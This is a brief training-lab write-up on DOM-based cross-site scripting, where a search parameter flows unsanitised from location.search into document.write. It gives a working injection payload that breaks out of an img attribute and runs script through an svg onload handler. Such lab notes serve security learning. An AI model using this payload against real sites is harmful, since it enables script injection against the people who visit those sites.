# Lab 3 — DOM XSS document.write + location.search (APPRENTICE)

## Payload
```
/?search="><svg onload=alert(1)>
```

## Taint Flow
`location.search` → `document.write('<img src="' + query + '">')`
